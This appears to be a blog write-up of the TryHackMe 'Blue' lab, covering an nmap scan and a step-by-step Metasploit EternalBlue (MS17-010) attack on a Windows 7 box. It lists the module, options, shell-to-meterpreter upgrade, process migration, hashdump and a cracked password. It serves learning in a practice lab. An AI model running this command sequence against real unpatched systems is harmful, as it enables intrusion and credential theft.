---
title: Blue
date: 2020-05-26
hero: /images/posts/try-hack-me/blue.gif
categories:
- "try-hack-me"
tags:
- windows
- metasploit
- eternal-blue
---

Blue explores the dated, but widespread EternalBlue exploit. This exploit was used in the WannaCry ransomware attack which crippled healthcare systems and spread to millions of computers in a matter of days. In this room we are prompted to exploit this vulnerability using Metasploit.

## Tools

* metasploit
* nmap

## Walkthrough

First things first. Let's conduct a scan on the box using the command `nmap -sS -sV -A $IP`. 

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 00:27 EDT
Nmap scan report for 10.10.203.178
Host is up (0.14s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-05-24T04:28:55+00:00; -1s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h14m59s, deviation: 2h30m00s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:fd:24:c1:40:16 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-05-23T23:28:50-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-05-24T04:28:50
|_  start_date: 2020-05-24T04:27:10

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.79 seconds
```

Looking at the results the machine is running Windows 7 Professional 7601. If we google this version number we can find out that this version might be vulnerable to the "EternalBlue" (MS17-010) vulnerability. You can read more about it [here](https://www.exploit-db.com/exploits/42315). Now that we are done with recon, we can begin to try and gain access.

To gain access we are going to be using `metasploit`. To start `metasploit` use the command `msfconsole`. Then let's ping the server just to be sure that we can connect. `ping $IP`. In the `metasploit` console we can use the command `search MS17-010` to see exploits we can use. Next we can see payload 3 that has the title `exploit/windows/smb/ms17_010_eternalblue`. This is the code will will use to run against the machine. Now that these payloads are found we can use the command `use 3` to load the payload. Now that we have our payload set we can the options. Use the command `show options` to see which options we need to set in order to use our attack. We can see that the only field that is required but not set is the `RHOSTS`. To set this field we can use the command `set RHOSTS 10.10.100.140`. Now when we do `show options` again we should be able to see our target IP address. Now that all the options are set run the command `exploit` to launch our payload.

Now that we have access to the machine that we want, we can upgrade our shell to a `meterpreter` shell. The easy way to do this, given that we have already put the shell in the background using CTRL-Z. We can use the command `sessions` to see the sessions. In my instance the session we are interested in has the ID 1. So I will use the command `sessions -u 1`. But you can also use the module `post/multi/manage/shell_to_meterpreter`, then use the command `use post/multi/manage/shell_to_meterpreter`. Now that we are using the post exploit module we can set the SESSION option to the session ID. Use the command `set SESSION 1`. Now that the session is set, let's fire up the meterpreter. Now let's `run`. Once execution is complete press enter and select the new meterpreter session from our available sessions. Use the command `sessions 2`. Now that we are in the meterpreter shell we can use the command `shell` then `whoami` to verify that we are the `nt authority\system` user. Now let's take a look at the processes using the command `ps`. Write down a process id towards the bottom of the list to migrate to. This might be unstable and not work the first time. If it fails try again (this is what tryhackme says). I used the `LiteAgent.exe` process and it worked. Now that we have migrated the process let's get the user's hashes. Use the command `hashdump` and if the privileges were escalated correctly we should see all the users and their hashes. We can also see that there is a user named 'Jon'. Now to crack his password. I used the website [CrackStation](https://crackstation.net/). To crack the password. Turns out this user's password is `alqfna22`.

The first flag can be found in the root directory in the file `flag1.txt`. The third flag is in the user Jon's documents. The second flag is found in the directory `C:/Windows/system32/config`. This is also the directory where windows passwords are stored. Interesting stuff.

This was a fun box and I feel like I have a better understanding of navigating through Windows directories and using the metasploit.
